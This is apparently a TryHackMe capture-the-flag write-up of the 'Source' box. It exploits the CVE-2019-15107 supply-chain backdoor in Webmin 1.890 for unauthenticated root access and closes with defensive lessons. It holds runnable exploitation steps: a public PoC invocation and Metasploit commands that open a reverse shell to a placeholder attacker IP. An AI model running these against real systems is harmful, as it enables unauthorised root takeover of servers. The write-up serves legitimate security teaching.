Source is an Easy Linux box from TryHackMe with a single lesson behind it, told by its own flags: *update your install*, and *supply-chain compromise*. The box runs **Webmin 1.890**, a version that falls inside the range poisoned by the infamous **CVE-2019-15107** backdoor — malicious code that was slipped into Webmin's official build and shipped to everyone who downloaded it. Because the vulnerable `password_change.cgi` runs inside a Webmin daemon that itself runs as **root**, a single unauthenticated request gives a root shell outright. There is no privilege escalation; the foothold *is* root.

## Reconnaissance & Enumeration

### Port Scan

A full TCP scan with service and default-script detection. `-p-` covers all 65,535 ports, `-sCV` runs the default NSE scripts plus version detection, and `-Pn` skips host discovery.

```bash
sudo nmap -p- -sCV -Pn -n 10.128.159.82 -oN nmap
```

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

Only two services. SSH is unremarkable, so everything points at port **10000** — **MiniServ 1.890**, the HTTP daemon behind **Webmin** (a web-based system-administration panel).

One important gotcha: nmap labels port 10000 as `http`, but Webmin here only answers over **HTTPS**. Browsing to `http://…:10000` fails; `https://…:10000` serves the login page (with a self-signed-certificate warning):

![The Webmin login page served over HTTPS on port 10000](/assets/img/THM/Source/cap1.png)

We don't need credentials, though — the version itself is the vulnerability.

## Initial Access — CVE-2019-15107 (Webmin Backdoor RCE) as `root`

**CVE-2019-15107** is not an ordinary bug — it is a **backdoor**. In 2019 an attacker compromised Webmin's build infrastructure and injected malicious code into the source that was then packaged and distributed through official channels. Every release from **1.882 to 1.921** (1.890 included) carried it. The backdoor lives in `password_change.cgi`: when the "change expired password" feature is enabled, the `old` password parameter is passed to a shell without sanitisation, so an **unauthenticated** attacker can inject a command simply by sending a crafted POST request — a textbook **command injection** reachable with no login at all.

[MuirlandOracle's PoC](https://github.com/MuirlandOracle/CVE-2019-15107) automates it. It detects the SSL mode on its own, confirms the version is vulnerable, and drops into a pseudoshell:

```bash
python3 CVE-2019-15107.py 10.128.159.82
```

```bash
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.128.159.82:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!
[+] The target is vulnerable and a pseudoshell has been obtained.

# whoami
root
```

That is **root** immediately — both flags are readable from the same shell, with no further steps:

```bash
# cat /root/root.txt
REDACTED
# cat /home/dark/user.txt
REDACTED
```

### Why the foothold is already root

A single unauthenticated request landing us as root is worth understanding rather than just accepting. The command injection executes with the privileges of the process that handles the request — and that process is the Webmin daemon:

```bash
# ps -aux | grep miniserv
root  1231  /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

`miniserv.pl` runs as **root** (which Webmin needs to manage the whole system). So any code injected through it inherits root, and there is simply no lower-privileged user to escalate from. The lesson is the flip side of least privilege: a service that must run as root turns *any* RCE in it into a full compromise.

### The same thing in Metasploit

Metasploit ships the identical exploit, which is handy for confirming the finding or integrating it into a wider engagement:

```bash
msf > use exploit/linux/http/webmin_backdoor
msf exploit(linux/http/webmin_backdoor) > set RHOSTS 10.128.159.82
msf exploit(linux/http/webmin_backdoor) > set LHOST <ATTACKER_IP>
msf exploit(linux/http/webmin_backdoor) > exploit
```

The module's defaults already match this target — `RPORT 10000`, and crucially `SSL true` (without which it would try plain HTTP and fail), with a `cmd/unix/reverse_perl` payload. It runs its own vulnerability check, fires the backdoor, and returns a root shell:

```bash
[+] The target is vulnerable.
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (<ATTACKER_IP>:4444 -> 10.128.159.82:39230)

whoami
root
```

## Key Takeaways

- **Supply-chain compromise is the whole story.** CVE-2019-15107 wasn't a coding mistake Webmin made — it was malicious code injected into their build pipeline and shipped as a trusted release. You can follow every secure-development practice and still ship a backdoor if the thing you *build from* is compromised. Verifying checksums/signatures of what you install, and watching for post-disclosure updates, is the defence.
- **"http" in an nmap result is a guess, not a guarantee.** Port 10000 answered only over HTTPS; assuming plain HTTP would have stalled the whole box at the first step. When a service misbehaves, try the other scheme (and remember Metasploit's `SSL true`).
- **A service running as root makes every bug critical.** Webmin's `miniserv.pl` runs as root by design, so the command injection skipped straight to the highest privilege with no escalation. Where a daemon genuinely needs root, that is exactly where patching discipline and network isolation matter most.
- **Keep management interfaces off the open network.** Webmin on 10000 was directly reachable. Admin panels belong behind a VPN or an allow-list, not exposed to anyone who can reach the host — a single n-day then can't become instant root.
